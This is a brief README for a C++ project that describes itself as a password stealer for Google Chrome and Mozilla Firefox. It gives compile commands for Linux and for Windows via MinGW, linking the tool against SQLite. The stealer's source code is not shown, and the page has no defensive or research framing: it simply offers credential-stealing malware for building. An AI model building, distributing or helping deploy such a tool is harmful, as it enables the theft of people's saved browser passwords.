# stealer

Password stealer for Google Chrome and Mozilla Firefox.

You can compile it for Linux using commands below:
```
gcc -c sqlite3.c
g++ -o <programname> -pthread stealer.cpp sqlite3.o -ldl -std=c++1z
```
  
And for Windows you have to execute following command using MinGW:
```
gcc -c sqlite3.c
g++ -o <programname> stealer.cpp sqlite3.o -std=c++1z
```
